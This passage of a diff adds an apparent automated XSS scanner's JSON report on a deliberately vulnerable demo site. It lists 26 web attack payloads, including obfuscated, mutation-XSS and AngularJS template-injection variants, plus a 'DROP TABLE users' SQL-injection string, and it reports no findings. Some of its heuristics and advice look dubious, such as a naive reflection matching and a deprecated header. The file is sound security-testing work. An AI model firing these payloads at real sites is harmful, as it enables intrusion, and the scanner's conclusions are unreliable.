@@ -1,0 +1,2224 @@
+{
+  "url": "http://testphp.vulnweb.com",
+  "timestamp": "2025-04-16T19:57:36.195527",
+  "tests_run": 26,
+  "vulnerabilities_found": 0,
+  "analysis": [
+    {
+      "payload": "<script>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<svg onload=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "' OR 1=1; <script>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%27%20OR%201%3D1%3B%20%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "1'; DROP TABLE users; <script>alert('XSS')</script>--",
+      "test_url": "http://testphp.vulnweb.com?searchFor=1%27%3B%20DROP%20TABLE%20users%3B%20%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E--",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "';alert('XSS');//",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%27%3Balert%28%27XSS%27%29%3B//",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "\";alert('XSS');//",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%22%3Balert%28%27XSS%27%29%3B//",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>document.write('<img src=\"x\" onerror=\"alert('XSS')\">')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E%27%29%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>eval(location.hash.slice(1))</script>#alert('XSS')",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Eeval%28location.hash.slice%281%29%29%3C/script%3E%23alert%28%27XSS%27%29",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<iframe src='javascript:alert(1)'></iframe>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C/iframe%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<video><source onerror=\"javascript:alert('XSS')\">",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<body onload=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<input autofocus onfocus=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cinput%20autofocus%20onfocus%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cnoscript%3E%3Cp%20title%3D%22%3C/noscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%22%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>\\u0061lert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3E%5Cu0061lert%28%27XSS%27%29%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3CScRiPt%3Ealert%28%27XSS%27%29%3C/ScRiPt%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>a=alert;a('XSS');</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%3Ea%3Dalert%3Ba%28%27XSS%27%29%3B%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script nonce=abc>alert('XSS')</script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%20nonce%3Dabc%3Ealert%28%27XSS%27%29%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script src=\"data:text/javascript,alert('XSS')\"></script>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cscript%20src%3D%22data%3Atext/javascript%2Calert%28%27XSS%27%29%22%3E%3C/script%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "{{constructor.constructor('alert(\"XSS\")')()}}",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%7B%7Bconstructor.constructor%28%27alert%28%22XSS%22%29%27%29%28%29%7D%7D",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<div ng-app ng-csp>{{$eval.constructor('alert(\"XSS\")')()}}</div>",
+      "test_url": "http://testphp.vulnweb.com?searchFor=%3Cdiv%20ng-app%20ng-csp%3E%7B%7B%24eval.constructor%28%27alert%28%22XSS%22%29%27%29%28%29%7D%7D%3C/div%3E",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    }
+  ],
+  "base_analysis": {
+    "url": "http://testphp.vulnweb.com",
+    "timestamp": "2025-04-16T19:57:36.564684",
+    "vulnerabilities": [],
+    "reflection_points": [
+      {
+        "framework": "angular",
+        "context": "framework_detection",
+        "reflection_type": "framework"
+      }
+    ],
+    "sinks_identified": [],
+    "defense_mechanisms": [],
+    "risk_level": "low",
+    "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+    "sanitization_detected": {
+      "detected": true,
+      "mechanisms": [
+        "html_encoding",
+        "tag_removal"
+      ]
+    },
+    "dom_analysis": {
+      "vulnerable_patterns": [],
+      "sinks_identified": [],
+      "sources_identified": [
+        {
+          "source": "url_based",
+          "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+        }
+      ],
+      "risk_level": "low"
+    }
+  },
+  "vulnerable_paths": {
+    "/search.php?test=query": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "timestamp": "2025-04-16T19:57:46.139873",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "javascript_string",
+            "surrounding": "\"search.php?test=query\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/search.php?test=query&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:46.498705",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "javascript_string",
+            "surrounding": "\"search.php?test=query\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "test",
+            "value": "query",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/artists.php?artist=1": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+        "timestamp": "2025-04-16T19:57:46.856173",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'listproducts.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:47.269257",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'listproducts.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "artist",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/listproducts.php?cat=1": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "timestamp": "2025-04-16T19:57:47.661833",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'product.php?pic=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/2.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/3.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/4.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/5.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/7.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Donec mole...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
